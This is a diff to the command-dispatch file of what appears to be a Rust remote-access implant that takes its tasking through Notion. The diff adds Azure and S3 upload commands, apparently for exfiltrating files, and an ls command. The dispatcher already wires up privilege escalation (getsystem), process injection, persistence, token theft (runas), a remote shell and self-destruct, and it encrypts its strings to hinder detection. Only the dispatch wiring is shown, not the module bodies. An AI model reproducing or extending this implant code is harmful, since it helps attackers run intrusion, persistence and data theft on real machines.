@@ -8,6 +8,7 @@ use std::fmt;
 use crate::config::{ConfigOptions, ConfigOption};
 use crate::logger::Logger;
 // Command modules
+mod azupload;
 mod cd;
 mod config;
 mod download;
@@ -26,8 +27,10 @@ pub mod shell;
 mod shutdown;
 mod whoami;
 mod unknown;
+mod s3upload;
 mod selfdestruct;
 mod sysinfo;
+mod ls;
 
 /// Uses litcrypt to encrypt output strings
 /// and create `Ok(String)` output
@@ -49,6 +52,7 @@ pub(crate) use notion_out;
 
 /// All the possible command types. Some have command strings, and some don't.
 pub enum CommandType {
+    AzUpload,
     Cd,
     Config,
     Download,
@@ -56,6 +60,7 @@ pub enum CommandType {
     Getprivs,
     Getsystem,
     Inject,
+    Ls,
     Portscan,
     Persist,
     Ps,
@@ -64,6 +69,7 @@ pub enum CommandType {
     Save,
     Selfdestruct,
     Runas,
+    S3Upload,
     Shell,
     Shutdown,
     Sysinfo,
@@ -173,6 +179,7 @@ impl NotionCommand {
             let command_args  = CommandArgs::from_split(command_words);
 
             let command_type: CommandType = match t {
+                "azupload"     => CommandType::AzUpload,
                 "cd"           => CommandType::Cd,
                 "config"       => CommandType::Config,
                 "download"     => CommandType::Download,
@@ -180,12 +187,14 @@ impl NotionCommand {
                 "getprivs"     => CommandType::Getprivs,
                 "getsystem"    => CommandType::Getsystem,
                 "inject"       => CommandType::Inject,
+                "ls"           => CommandType::Ls,
                 "persist"      => CommandType::Persist,
                 "portscan"     => CommandType::Portscan,
                 "ps"           => CommandType::Ps,
                 "pwd"          => CommandType::Pwd,
                 "rev2self"     => CommandType::Rev2Self,
                 "runas"        => CommandType::Runas,
+                "s3upload"     => CommandType::S3Upload,
                 "save"         => CommandType::Save,
                 "selfdestruct" => CommandType::Selfdestruct,
                 "shell"        => CommandType::Shell,
@@ -203,6 +212,7 @@ impl NotionCommand {
     /// Executes the appropriate function for the `command_type`. 
     pub async fn handle(&mut self, config_options: &mut ConfigOptions, logger: &Logger) -> Result<String, Box<dyn Error>> {
         match &self.command_type {
+            CommandType::AzUpload     => azupload::handle(&mut self.args, logger).await,
             CommandType::Cd           => cd::handle(&mut self.args),
             CommandType::Config       => config::handle(&mut self.args, config_options, logger).await,
             CommandType::Download     => download::handle( &mut self.args, logger).await,
@@ -210,19 +220,21 @@ impl NotionCommand {
             CommandType::Getprivs     => getprivs::handle().await,
             CommandType::Getsystem    => getsystem::handle(logger).await,
             CommandType::Inject       => inject::handle(&mut self.args, logger).await,
+            CommandType::Ls           => ls::handle().await,    
             CommandType::Persist      => persist::handle(&mut self.args, config_options, logger).await,
             CommandType::Portscan     => portscan::handle(&mut self.args, logger).await,
             CommandType::Ps           => ps::handle().await,
             CommandType::Pwd          => pwd::handle().await,
             CommandType::Rev2Self     => rev2self::handle().await,
             CommandType::Runas        => runas::handle(&self.args).await,
+            CommandType::S3Upload     => s3upload::handle(&mut self.args, logger).await,
             CommandType::Save         => save::handle(&mut self.args, config_options).await,
             CommandType::Selfdestruct => selfdestruct::handle().await,
             CommandType::Shell        => shell::handle(&mut self.args).await,
             CommandType::Shutdown     => shutdown::handle().await,
             CommandType::Sysinfo      => sysinfo::handle().await,
             CommandType::Whoami       => whoami::handle().await,
-            CommandType::Unknown      => unknown::handle().await,
+            CommandType::Unknown      => unknown::handle().await
         }
     }
 }
